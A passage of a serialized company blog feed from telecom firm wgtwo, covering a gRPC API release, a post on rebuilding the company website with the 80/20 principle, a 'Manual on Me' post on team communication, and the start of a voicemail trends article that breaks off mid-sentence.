gRPC, our published proto-files are the contract for our APIs. This makes documentation easier, and makes it easy to ensure we don\u2019t break our existing APIs.\\n\\nMany of the APIs listed here are streaming APIs. In our experience gRPC makes implementing streams easy. We do also use protobufs a lot internally, and we have found that it helps us implement changes in a non-breaking way and has also aided us in making communication between services written in different languages work without too much hassle.\\n\\n\\n### Our API playground\\n\\nA lot of our APIs are still in v0. The v0 APIs is our playground where we have been testing out what functionality we actually need, and how we can expose that in a way that is easy to use.\\n\\nThis includes APIs for receiving SMS, building WebRTC clients, setting up SIP integrations, and more.\\n\\nFor production usage, we do recommend that you stick to our released APIs as we may make breaking changes to our v0 APIs without any notice. You are however free to use them for demo purposes, and we would be very happy to receive feedback if there is anything you need to build your next product.\\n\\nIf you have any questions, feel free to reach out at products@wgtwo.com and visit our docs website for a deeper dive and more code examples of the various APIs we provide: https://v1.docs.wgtwo.com/."},{"id":"new-website","metadata":{"permalink":"/blog/new-website","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-02-25-website-redesign/index.md","source":"@site/../blog/2022-02-25-website-redesign/index.md","title":"How I leveraged the 80/20 principle to rebuild wgtwo.com","description":"For a company that provides an innovative solution across the telecommunication sector, I believe it is essential to have a web presence that effectively communicates our vision.","date":"2022-02-25T00:00:00.000Z","formattedDate":"February 25, 2022","tags":[{"label":"website","permalink":"/blog/tags/website"},{"label":"react","permalink":"/blog/tags/react"}],"readingTime":16.85,"hasTruncateMarker":true,"authors":[{"name":"Jonny Griffin","title":"Security Tech Lead","url":"https://www.linkedin.com/in/jonnathangriffin/","imageURL":"/img/author-photos/jg.jpg","key":"jonny-griffin"}],"frontMatter":{"slug":"new-website","title":"How I leveraged the 80/20 principle to rebuild wgtwo.com","tags":["website","react"],"authors":["jonny-griffin"],"image":"./wgtwo-home-3.0.png"},"prevItem":{"title":"We are releasing our first production-ready gRPC APIs!","permalink":"/blog/releasing-our-first-grpc-apis"},"nextItem":{"title":"Manual on Me: Matt Long","permalink":"/blog/manual-on-me-matt-long"}},"content":"import { ImgComparisonSlider } from \'@img-comparison-slider/react\';\\nimport Image from \\"@theme/IdealImage\\";\\nimport styles from \\"./styles.css\\";\\nimport Highlight from \'@site/src/components/highlight/Highlight\';\\n\\nFor a company that provides an innovative solution across the telecommunication sector, I believe it is essential to have a web presence that effectively communicates our vision. \\nThis blog post illustrates my approach to taking the content of our existing website and transforming it into a completely new online presence, what it is today. This is the story of leveraging the Pareto 80/20 Principle to effectively portray **wgtwo** as the innovative telco brand it is.\\n\\n\x3c!--truncate--\x3e\\n\\n<center><b><Highlight color=\\"#000\\">wgtwo.com 2.0 => wgtwo.com 3.0</Highlight></b></center>\\n<center><i>before and after</i></center>\\n\\n<ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n    <img slot=\\"first\\" src={require(\'!file-loader!./wgtwo-home-2.0.png\').default} />\\n    <img slot=\\"second\\" src={require(\'!file-loader!./wgtwo-home-3.0.png\').default} />\\n</ImgComparisonSlider>\\n\\n#### Background\\n\\nI recently listened to a podcast about a CEO making her biggest mistake - not promoting within her company. She was pressured into hiring an external CEO to fill her position while she could focus on leading the design initiatives. Long story short, this was her biggest mistake and she learned that promoting people from within the company leads to better results.\\n\\nOutsourcing the design of our website, this podcast made it clear to me why it failed to show the true identity of **wgtwo**. What we needed was a clear storyline, dialogue, and understanding of the Insider to simplify and structure the content, giving the viewer an intuitive understanding. \\n\\nAt **wgtwo** we have a startup culture where we build initiatives from the ground up - self-doing and empowering the developer. The company promotes this concept on a semi-quarterly basis through hackdays - where we creatively solve complex problems and build new solutions for our telco core network or learn a new programming language.\\n\\nKnowing the inner workings of our technology and services and having a hidden passion for creating websites I was in the perfect position to change reality. One day during a daily standup, the inner spark was lit and it was go time.\\n:::tip Steps taken for building a new website\\nStep 1: setting the objectives  \\nStep 2: understand the 5 main issues of the wgtwo online presence   \\nStep 3: come up with strategies to solve  \\nStep 4: organize important content and design away - tell a story  \\nStep 5: code it up  \\n:::\\n\\n## Step 1: Objectives\\n\\n### 80/20 Principle\\n\\nBefore diving into the nitty-gritty details of how I achieved to build a new website in a week, I wanted to briefly discuss the concept of the [Pareto 80/20 Principle](https://en.wikipedia.org/wiki/Pareto_principle). Essentially, if someone is not aware of the concept, it has been around for a while but in theory, is a concept that has been applied and proven by many economists. This principle can be applied to wealth, consumption, consequences, and most importantly output and results.\\n\\n:::info 80/20 Principle High Level\\n\u276f the majority, that has little impact  \\n\u276f the small minority, that has a major, dominant impact \\n\\n20% input = 80% output  \\n20% effort = 80% results\\n\\n80% = Done\\n:::\\n\\nFor the website, it was important to focus on, what is our 20% input. If a task comes to the table then it was important to know the importance of the task, and how much time should be spent on this. I will be referencing back to this 20% input and 80% output. For our context, 80% is a completed website.\\n\\n### Objectives\\n\\nI needed a mechanism to scope the amount of work and be able to \\"grade\\" the work at the end to ensure I meet my goal and most importantly, not get distracted from the goal. Part of the 80/20 principle is to ensure that 20% of the work is done to achieve 80% of the output. \\n\\n#### Primary objectives (80%)\\n\\nA website is used by an audience. It was important to understand the end-user so I can ensure that their experience was prioritized. After brainstorming I came up with two scenarios:\\n\\n- Commercial: Convert potential customers from being interested in taking action\\n- Talent: Inspire software engineers to consider **wgtwo** as their next employer and start engaging with us\\n\\n#### *Secondary objectives*  \\n\\nAs our secondary objectives, these were still always in the back of our head but in theory, had less of a priority. There was some overlap with the primary objectives. In the end, however, I was able to also include this as part of the 80% website offering as a lot of the written content previously existed on the old website.\\n\\n- Third parties: Educate media, analysts, and third-party developers about the future of our industry and our offerings\\n- Internal: Be an active platform for external knowledge sharing by employees (docs, policies, case studies, blogs, etc)\\n\\n### Personas\\n\\nOk sweet, so now that I have our *finite goal* in mind, let\'s think about the personas related to achieving our goals and objectives. Specifically, I found that it made sense to have two groups of personas, *external and internal*. \\n\\n#### External audience\\n\\nWe can think about external audiences as who is using the website.\\n\\n* I am a technical manager at MVNO company x trying to learn about how **wgtwo** solves business problems for me\\n* I am a software engineer looking for a new challenge and job within the telco space\\n* I am an existing customer of **wgtwo** finding documentation to APIs and contact details\\n* I am an existing customer looking to find their security documentation\\n* I work at a news outlet (journalist, analyst, investors) trying to find more information about **wgtwo**\\n\\n> 2 out of 5 were true with the old website\\n\\nCreating these statements allowed me to think about what content is important and the organizational architecture. This gave us the criteria to then grade our content for each bullet point.\\n\\nAs an example, focusing a lot of time on creating a storyline was critical for answering the questions around content organization on what business problems **wgtwo** solves, hiring and recruiting, and links to our external products like API Docs and support portals, as they did not exist before. \\n\\n#### Internal audience\\n\\nIt was important to include internal personas as the website will be updated, maintained, and managed by whom, internal personas. Previously, the old wgtwo.com had a problem that the website was only updated by a select few in the sales team - but even then - an external request to a third-party company has to be made.\\n\\nWho and how will **wgtwo** be updating the website. In short, everyone will have access to the website and be able to update content. \\n\\n* I am an engineer looking to write a technical blog post in markdown\\n* I am the head of marketing looking to post company news about a new feature **wgtwo** deployed\\n* I am the head of marketing looking to update the header text on the homepage\\n* I am an engineer looking to add a new link to the APIs doc\\n* I am an engineer looking to add a new page about details of Voice\\n* I am the CTO looking to update our tech page as I have a new capability\\n* I am the CEO finding information about how I do XYZ for a sales chat\\n* I am a salesperson looking to add a case study\\n* I am a salesperson looking to find a link to more information to send to a customer \\n\\n> 2 out of 9 were true with the old website\\n\\nEssentially, from these bullet-point lists above, I reflected and see that well I have a technical and non-technical persona that needs to be able to update the website. I need something modern and scalable to allow rich and modern web content while basic text blog posts and documentation. This was important when determining the tech stack for the website.\\n\\n## Step 2,3,4: Problem Analysis and Solution\\n\\nThe bulk of the blog post will be this section. To help organize and communicate the problems, approach, and solution - there were a few domains that were clear to me that required work and altering. \\n\\nBefore tackling any problem listed before, it went through a process such as:\\n\\n1. **Problem**: Identity what was not working with the old website and keep a total list\\n2. **Approach**: Look back at the personas and objectives as mentioned earlier and come up with a definition of done (DoD)\\n3. **Solution**: Have an ordered priority list of action items that must be done. It was important to review this list multiple times to ensure that one item on this list did not take more than 20% of the time compared to the other items. \\n\\nOk, I am starting to get somewhere. Let\'s jump into some identified problem domains and see how I was able to achieve a cleaver solution and impact.\\n\\n### <Highlight color=\\"#000\\">Storyline</Highlight>\\n**Problem**: Unclear message of what the **wgtwo** business is.  \\n**Approach**: Envisioning different personas (mvno employee, 3rd party developer, journalist, future **wgtwo** employee) trying to explain the business in different ways. Essentially, how can I build an elevator pitch for the website viewer?    \\n**Solution**: Restructuring the existing content on the website, and intuitively creating a hierarchy of content. I achieved this via a landing homepage that is made up of several components.  \\n(Example homepage: Intro, Vision, product, existing customers, case studies for future customers, action to get in touch) \\n\\n<details>\\n  <summary>Homepage - Landing Page</summary>\\n  <div>\\n    <div>\\n        The old homepage displayed on the left and new on the right. The homepage here took the most about of time to complete, as this is the key page for the website. <br/><br/>\\n        <Highlight color=\\"#ef507f\\">What are we selling</Highlight> => <br/><Highlight color=\\"#000\\">Mobile Core Network</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">No details on what the product is</Highlight> => <br/><Highlight color=\\"#000\\">Added a section of Console</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">No information from existing customers</Highlight> => <br/><Highlight color=\\"#000\\">Added a testimonial</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">No sense of credibility</Highlight> => <br/><Highlight color=\\"#000\\">Logos with external links to business deals</Highlight><br/><br/>\\n    </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./wgtwo-homepage-2.0-full.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./wgtwo-homepage-3.0-full.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n<details>\\n  <summary>Taking a page from Apple and Facebook</summary>\\n  <div>\\n    <div>\\n        When analyzing other websites, I noticed one similarity between them. Short descriptive text, with a <b>period</b>, and usage of <b>color</b>. \\n    </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./facebook-messenger.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./ipad-mini.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n### <Highlight color=\\"#000\\">Branding</Highlight>\\n**Problem**: No clear **wgtwo** identity, different brand names / no clear \u201cslogan\u201d   \\n**Approach**: Understand our personas, business model, and decide on a central way to communicate our brand // analysis of existing content to understand how the brand should be communicated   \\n**Solution**: Working Group Two AS = company name, while when referencing our company, **wgtwo** in bold - all lowercase to match our logo // programmable, scalable, innovative \\n\\n<details>\\n  <summary>What\'s our company name?</summary>\\n  <div>\\n    <div>\\n        The old website had five different ways of writing our company name. 5. If we can\'t even get it right, how could someone else? Let\'s start and create a new standard for our name - as shown below!<br/><br/>\\n        <Highlight color=\\"#ef507f\\">Working Group 2</Highlight> => <br/><Highlight color=\\"#000\\">Working Group Two AS</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">Working Group 2 As</Highlight> => <br/><Highlight color=\\"#000\\">Working Group Two AS</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">WorkingGroup2</Highlight> => <br/><Highlight color=\\"#000\\">Working Group Two AS</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">WGTWO</Highlight> => <br/><Highlight color=\\"#000\\">wgtwo</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">WG2</Highlight> => <br/><Highlight color=\\"#000\\">wgtwo</Highlight><br/><br/>\\n    </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./branding-wg2.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./branding-wgtwo.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n<details>\\n  <summary>Word analysis</summary>\\n  <div>\\n      <div>\\n        Surprisingly, website 2.0 had some great text. A lot of work was spent to build content about the mobile core network space. From a statistically point of view, I wanted to try to analyze what words were most frequent across the website to get an idea of what words we should focus on as part of the homepage hero header text.<br/><br/>\\n        To achieve this, I had to run a script to download the HTML of the website, as we did not even own the source code of the website. Below you can see the small script I ran to recursively download all pages from the old website. From some small grepping, I found our that <Highlight color=\\"#000\\">innovation</Highlight> was one of the top lists.<br/><br/>\\n        <code>wget --recursive --page-requisites --adjust-extension --span-hosts --convert-links --restrict-file-names=windows --domains wgtwo.com --no-parent wgtwo.com</code>\\n      </div>\\n    <br/>\\n    <img src={require(\'!file-loader!./innovation-25.png\').default} />\\n    <br/>\\n  </div>\\n</details>\\n\\n### <Highlight color=\\"#000\\">Content organization</Highlight>\\n**Problem**: Hidden content (too long paths)  \\n**Approach**: [Miro](https://www.mirco.com) board chart to understand the existing website structure and content  \\n**Solution**: everything accessible via <ins>one click</ins>, make more use out of the header and footer of the page\\n(Example: find the interview process page) \\n\\n<details>\\n  <summary>Mapping the website structure with Miro</summary>\\n  <div>\\n    <div>\\n        The goal of the new website was to make everything accessible from one click from the home page. If this meant a link in the footer, or a call to action within a component. It should be super clear as the viewer to understand where they are when navigating on the website.<br/><br/>\\n        This was a time consuming process to map out the structure of the old website but in doing so, it was / is quite clear that the new website has a huge improvement in readability.<br/><br/>\\n        <Highlight color=\\"#ef507f\\">27 pages</Highlight> => <Highlight color=\\"#000\\">8 pages</Highlight>\\n    </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./structure-2.0.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./structure-3.0.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n<details>\\n  <summary>Product Ecosystem</summary>\\n  <div>\\n      <div>\\n        Analyzing the old website, I realized that the product ecosystem consisted of 5 pages with various dead-end links going to various other pages. This made it really difficult for even myself (someone who already knows the product), what was trying to be communicated. I was able to use a dialog box with bullet points to describe the two products in a clever way that can be viewed on just a single page.<br/><br/>\\n        <Highlight color=\\"#ef507f\\">5 pages</Highlight> => <Highlight color=\\"#000\\">1 page</Highlight>\\n      </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./pe-2.0.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./pe-3.0.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n### <Highlight color=\\"#000\\">User Experience</Highlight>\\n**Problem**: Difficult to read text, website nonresponsive, outdated, not techy   \\n**Approach**: Adopt a modern scalable framework using React, Typescript, Docusourus. Thoroughly test the site on desktop and mobile when developing.    \\n**Solution**: no images only text-based site, clear structure of header/subtitles/text, mobile-friendly, and brand messaging! \\n\\n<details>\\n  <summary>Shutterstock images to graphical text</summary>\\n  <div>\\n      <div>\\n        Rather than filling a page with default, free, standard images from shutterstock.com, I spent the time to fill a page with meaning messaging where the viewer can learn about <b>wgtwo</b>.\\n        <br/><br/><Highlight color=\\"#ef507f\\">Shutterstock images</Highlight> => <Highlight color=\\"#000\\">Crafted messaging</Highlight>\\n      </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./shutterstock.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./vision.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n<details>\\n  <summary>Mobile Friendliness</summary>\\n  <div>\\n      <div>\\n        My vision is that every single landing page is mobile-friendly with the sense that heading and supporting text can be read on one screen. The size of the font.\\n        A known formula to help calculate the font size, take the user\'s age, divide by two, and that is the font size. E.g. <ins>60 age / 2 = 30px</ins>\\n        <br/><br/><Highlight color=\\"#ef507f\\">Non-descriptive headers</Highlight> => <Highlight color=\\"#000\\">Product we are selling</Highlight>\\n      </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./mobile-friendly-2.0.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./mobile-friendly-3.0.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n<details>\\n  <summary>Interview process</summary>\\n  <div>\\n      <div>\\n        One of the primary goals for the new website was hiring. You can see on website 2.0 there is a terrible empty white space. We asked the previous website owner to fix this and after a month no fix. The new website career page has an interactive element where the culture text will scroll down as the reader explores the different interview phases.\\n        <br/><br/><Highlight color=\\"#ef507f\\">A weird empty white space</Highlight> => <Highlight color=\\"#000\\">Interactive elements</Highlight>\\n      </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./interview-process-2.0.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./interview-process-3.0.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n### <Highlight color=\\"#000\\">Operational</Highlight>\\n**Problem**: Few internal people and externals can update the site, hosted on WordPress, managed by externals   \\n**Approach**: Understand user personas for the website to ensure all internal users can make updates / give people in the company the ability to work on the website/ inspire to be proactive in making blog posts again / create an identity within the company (every tech company should own their tech)   \\n**Solution**: Public git repo, markdown, education material in updating the site, a framework to inspire to create content \\n(Example: blog, docs) \\n\\n<details>\\n  <summary>Goodbye Wordpress, Hello React</summary>\\n  <div>\\n      <div>\\n        The old website was built leveraging Wordpress. To make any changes to this website, we had to send an email, wait a week, pay money, and wait. This process of improving the site was impossible. Now we have everything hosted in Github where anyone can create a pull request and apply a change. <br/><br/>\\n        <Highlight color=\\"#ef507f\\">7 days</Highlight> => <Highlight color=\\"#000\\">5 minutes</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">$$$$</Highlight> => <Highlight color=\\"#000\\">0</Highlight>\\n      </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./request-email.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./github-repo.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n## Step 5: The tech\\n\\nAs mentioned in the Internal audience, I needed to cater to personas inside our company that were both technical and non-technical. I had use-cases where I wanted something that could be self-managed and hosted low maintenance and was a modern and scalable workflow.\\n\\n- The non-techy staff and blog posts such as this, the industry-standard now days is markdown. So I knew I needed markdown.\\n- For the techy to make a website that could be customizable, secure, scale, and use APIs - react is also an industry standard. In addition, I wanted something that generated just plain HTML so I could host on GitHub without an issue.\\n\\n:::tip The tech\\n* React/Typescript - Scalable modern framework that allows for complex API calls. For example, it came in handy for creating our Careers Page\\n* https://docusaurus.io - native support for markdown allowing for a rich blog (which is what you are reading today!)\\n* Github and GH Actions for hosting, building, and collaborating\\n:::\\n\\n## Lessons learned\\n### What went well\\n- 80/20 model was critical to get progress made in a week.\\n- Scoping the project with a defined time (1 week) helped. I scoped it in several ways such as focusing what links to include in the header and footer, as well as, keeping the original text as much as possible from the previous website. \\n- Keeping this initiative small. The fewer people, the faster one can move and make decisions and get stuff done.\\n- Accepting that a website is never complete and focus on getting something out of the door.\\n- Using React with live reload was a breeze for quickly testing and demoing out new component designs\\n\\n### The bad\\n- Don\'t waste time on illustrations. Illustrations are tricky because it is a love/hate relationship. Some will love, and others will dislike - and seldom a full agreement. Crafting good text will tell a better story than a cheap illustration that people remember. All in all, I probably wasted 5 hours trying to come up with solutions and doing research that ended with the original text I had in about 5 minutes of thinking.\\n- Handling a company-wide iniative, several people have opinions in how things can be best done. This critique and push back can be hard for some people but I never let this get to me mentally and instead followed my gut and kept pushing forward. \\n\\n### What I learned\\n- I learned a new framework and language - React, Typescript, Docusaurus\\n- I learned about modern website design concepts\\n- I learned how Github actions work\\n- I learned how to better prioritize my time\\n- I learned the importance of following your gut and doing what I am passionate about\\n- I learned how hard illustrations are\\n\\n## Today\\n\\nAfter the week was up, it was time to present this new website in our company-wide Friday demos. After a short 15 minute walkthrough, the excitement I bottled up has now been spread across the company. Several hip hip hoorays and smiles around. People feel like wgtwo\'s identity is now represented. Some that were never interested before are now providing feedback and are inspired to write blog posts.\\n\\nOur new website is a living, breathing machine telling our company\'s story one day at a time.\\n\\n*Overall, I want to say a special thanks to my little Senja Mae and my wife Sophia for chilling on the couch with me while I spent countless hours using Apple airplay to cast my computer screen on the tv while coding away.*"},{"id":"manual-on-me-matt-long","metadata":{"permalink":"/blog/manual-on-me-matt-long","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-02-08-manual-on-me-matt-long/index.md","source":"@site/../blog/2022-02-08-manual-on-me-matt-long/index.md","title":"Manual on Me: Matt Long","description":"As I was waking up this morning, I started surfing Reddit.  One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.","date":"2022-02-08T00:00:00.000Z","formattedDate":"February 8, 2022","tags":[{"label":"trust","permalink":"/blog/tags/trust"},{"label":"culture","permalink":"/blog/tags/culture"},{"label":"startup","permalink":"/blog/tags/startup"},{"label":"manual-on-me","permalink":"/blog/tags/manual-on-me"}],"readingTime":5.425,"hasTruncateMarker":true,"authors":[{"name":"Matt Long","title":"Engineering Manager for Edge, Cloud and Security","url":"https://www.linkedin.com/in/mattlong/","imageURL":"/img/author-photos/mtl-li.jpg","key":"mtl"}],"frontMatter":{"slug":"manual-on-me-matt-long","title":"Manual on Me: Matt Long","date":"2022-02-08T00:00:00.000Z","tags":["trust","culture","startup","manual-on-me"],"authors":["mtl"],"image":"./mtl-grayscale.png"},"prevItem":{"title":"How I leveraged the 80/20 principle to rebuild wgtwo.com","permalink":"/blog/new-website"},"nextItem":{"title":"Don\'t leave a message after the beep","permalink":"/blog/please-dont-leave-a-message-after-the-beep"}},"content":"As I was waking up this morning, I started surfing Reddit.  One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.\\n\\nThe responses varied.  Some were mildly positive, but most were very cynical since this sort of testing can be misused by bad management.  However, this got me thinking and, eventually, writing this post.\\n\\n\x3c!-- truncate --\x3e\\n\\nLet\'s look at the supervisor mentioned on Reddit and view their actions in a charitable light.  It is entirely probable that they only wanted to better understand and work with their new direct reports.  This is undoubtedly great!  However, a personality test is not a particularly useful tool for this -- people are too varied, and lives are too complicated.  This [interview](https://knowledge.wharton.upenn.edu/article/the-science-of-personality-understanding-yourself-and-those-around-you/) with Brian Little, the author of \\"Me, Myself and Us: The Science of Personality and the Art of Well-Being,\\" discusses some of the problems with these sorts of assessments.\\n\\nAnd as an employee, who wants a supervisor that uses an impersonal online test to figure out the best way to work with someone?\\n\\n## Our Process\\n\\nAt [Working Group Two](https://www.wgtwo.com), we do things a little bit differently.  We follow a straightforward process of [treating employees like grownups](https://www.wgtwo.com/blog/were-all-grownups-here/).  I thought it might be worth talking about how we handle the \\"let\'s try to understand our employees\\" problem and share a public version of what I have shared inside the company.\\n\\nThe short answer to this is this: just ask.  Amazing!\\n\\nWhen new employees start working with us, we ask them to fill out a \\"Manual on Me.\\" Since we are a distributed company and everyone is _de-facto_ remote, this manual serves two purposes: it is a bit of an icebreaker and a powerful communication tool.  Everyone in the company has a \\"Manual on Me,\\" from the CEO and CTO to the most recent new hire.\\n\\nAs Professor Little notes: \\"Once you understand what a person\'s core projects are or even ask a person, \'How is it going, David?,\' it puts us in a position where we can actually treat humans as humans.  That to me is going to pay enormous benefits in the long term.\\"\\n\\nHere\'s what I was asked to put into _my_ manual:\\n* What I know about that people can ask me\\n* How I think about things\\n* Common mistakes I make in my interactions with others\\n* My expectations from others\\n* What frustrates me\\n* How to reach out and get in touch with me\\n* How to give me feedback\\n\\nAlthough nobody in the company remembers how this practice actually started, this is not a completely new idea.  I see that there are a few references to this concept around the internet, including at least one [online version](https://www.manualof.me).  Their [about page](https://www.manualof.me/about) cites a few previous inspirations and sources for this \\"personal user manual.\\"\\n\\nSo how does this solve the problem on Reddit?  Assuming the OP\'s new supervisor really wanted to know their employees, they could *just ask* and probably find out just as much (or more) than having everyone take the MBTI.\\n\\n## My \\"Manual on Me\\"\\n\\nSo what does my \\"Manual on Me\\" look like?  Here is what I wrote in the summer of 2018:\\n\\n:::note Manual on Me\\n\\n![](./mtl-grayscale.png)\\n\\n**What I know something about:**\\n- I know a little bit about a lot of things.\\n- Recently, I\'ve been doing a lot of cloud infrastructure work, so that is freshest in my mind.\\n- I\'ve also had experience with development of embedded Java VMs, garbage collection, graphics drivers, distributed workflow systems, robotics, AI, machine learning, and autonomous ships.\\n\\n**How I think about things:**\\n- I like to challenge how things are done and find simpler solutions.  This often involves understanding why things are currently done the way they are.\\n- I very much like to think about an end goal and develop solutions _towards_ the goal.\\n- While I like to think a little about the steps in the middle, I don\'t like planning them in great detail.\\n\\n**Common mistakes I make in my interaction with you:**\\n- Sometimes, I will offer possibilities and suggestions as a way of discussion -- sort of like the \\"rubber duck\\" development process.  This is not _meant_ as a negative criticism but intended to continue the conversation and explore possibilities.  But I do understand how it can be interpreted in other ways.  Let me know if this is annoying!\\n\\n**My expectations to you:**\\n- I expect people to try, experiment, and learn.\\n- I also hope that everyone feels comfortable speaking up and expressing their point of view and ideas.\\n- If something is not clear, ask for clarification.\\n\\n**What frustrates me:**\\n- Bureaucracy, particularly rules that exist without an explanation of why the rule exists.\\n- Broken software systems.  When tied with bureaucracy, these are often known as \\"Enterprise software.\\"\\n\\n**How to reach out to me:**\\n- I prefer asynchronous messaging\\n\\t- Work Slack is absolutely the easiest way to reach me\\n\\t- SMS is second-best\\n- Voice is also fine as long as it is a reasonable time or arranged through one of the async methods.\\n\\n**How to give me feedback:**\\n- I like feedback, and direct, actionable feedback is fantastic!\\n- If it is serious, I like to have time to digest the feedback before I need to give a response, if possible.\\n\\n:::\\n\\nMost of this is still true, but maybe it is time for an update!\\n\\n## A management perspective\\n\\nAs a manager who likes to make sure my team is happy and enjoying their work (to the extent that I can do so), I really like these.\\n\\nWhen talking to new colleagues, I have a great way to start conversations (\\"So, where have you been climbing recently?\\", \\"How\'re the corona regulations in Canada these days?\\", \\"What type of photography do you like to do?\\").\\n\\nThey also help with giving and receiving feedback.  Should I drop a note into Slack, then set up a video meeting?  How blunt should I be?  Should I expect to talk about the feedback immediately or schedule a follow-up meeting after they (or I) have had a chance to think?\\n\\nBut most importantly, we feel that the \\"Manual on Me\\" is a respectful, adult way to communicate preferences without trying to pigeonhole everyone into one of sixteen types."},{"id":"please-dont-leave-a-message-after-the-beep","metadata":{"permalink":"/blog/please-dont-leave-a-message-after-the-beep","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-02-04-please-dont-leave-your-message-after-the-beep.md","source":"@site/../blog/2022-02-04-please-dont-leave-your-message-after-the-beep.md","title":"Don\'t leave a message after the beep","description":"Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it\u2019s been a while. The common view is that voicemail isn\u2019t popular any longer. That\u2019s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.","date":"2022-02-04T00:00:00.000Z","formattedDate":"February 4, 2022","tags":[{"label":"messaging","permalink":"/blog/tags/messaging"},{"label":"voicemail","permalink":"/blog/tags/voicemail"},{"label":"api","permalink":"/blog/tags/api"}],"readingTime":5.28,"hasTruncateMarker":true,"authors":[{"name":"Tor Odland","title":"Head of Marketing","url":"https://www.linkedin.com/in/torodland/","imageURL":"/img/author-photos/to.jpg","key":"tor-odland"}],"frontMatter":{"slug":"please-dont-leave-a-message-after-the-beep","title":"Don\'t leave a message after the beep","date":"2022-02-04T00:00:00.000Z","tags":["messaging","voicemail","api"],"authors":["tor-odland"]},"prevItem":{"title":"Manual on Me: Matt Long","permalink":"/blog/manual-on-me-matt-long"},"nextItem":{"title":"The specs behind the specs part 1","permalink":"/blog/the-specs-behind-the-specs-part-1"}},"content":"Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it\u2019s been a while. The common view is that voicemail isn\u2019t popular any longer. That\u2019s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.\\n\\n\x3c!--truncate--\x3e\\n\\n\u201cPlease leave your message after the beep\u201d - you\u2019ve probably heard it a million times, especially if you were born before 1982. Or you\u2019ve repeated that sentence over and over as you tried to make an attractive recording of your own voice as your greeting to a missed caller. We knew it wasn\u2019t necessary to say it (people knew what to do after the beep) but we still recorded it that way. Probably because we didn\u2019t know what else to say.\\n\\nFor many of us, those days are over. We just don\u2019t bother with setting up our voicemails, we never leave voicemails and we certainly never dial up to listen to a message someone left for us. For my own part, I don\u2019t even know if people who call me get to a voicemail system.\\n\\nTo others, voicemail is really crucial.\\n\\n> \u201cWe see the importance of voicemail increasing or declining based on specific demographics,\u201d says Luke Campbell, the CEO of [Vxt](https://www.vxt.co.nz), a communications technology company in New Zealand.\\n\\nLuke describes people working in transactional industries as particularly passionate about voicemail. Lawyers, real estate agents, plumbers - they might get dozens of calls every day. So where others turn off voicemail, these people might want to get their voicemails forwarded to their emails, be able to share their inbox with a colleague or assistant, have voicemails automatically translated to text and integrate their messages with productivity tools like Asana or an ERP system. Some need to have their messages stored for regulatory or security purposes. A real estate agent with (say) 10 000 contacts may want to customize the greetings so that every time one of the 200 Johns or Jessicas call, they get a personal message stating their 